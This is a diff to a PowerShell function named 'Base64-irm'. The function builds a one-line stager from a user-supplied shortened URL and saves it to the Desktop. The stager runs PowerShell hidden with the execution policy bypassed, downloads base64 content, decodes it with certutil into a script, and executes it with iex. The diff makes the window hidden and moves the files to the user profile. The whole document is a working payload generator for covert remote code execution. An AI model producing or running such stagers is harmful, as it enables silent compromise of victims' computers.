@@ -2,7 +2,7 @@ function Base64-irm {
     $url = Read-Host "Enter the URL (use https://t.ly/)"
 
     $scriptContent = @"
-powershell -NoP -Ep Bypass irm $url|sc "C:\Users\$env:USERNAME\Desktop\e.txt";certutil -f -decode "C:\Users\$env:USERNAME\Desktop\e.txt" "C:\Users\$env:USERNAME\Desktop\d.ps1";iex "C:\Users\$env:USERNAME\Desktop\d.ps1"
+powershell -NoP -W H -Ep Bypass irm $url -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
 "@
 
     $scriptPath = "$env:USERPROFILE\Desktop\Base64-irm.txt"
@@ -10,5 +10,3 @@ powershell -NoP -Ep Bypass irm $url|sc "C:\Users\$env:USERNAME\Desktop\e.txt";ce
 
     Write-Host "Script saved as $scriptPath"
 }
-
-Base64-irm
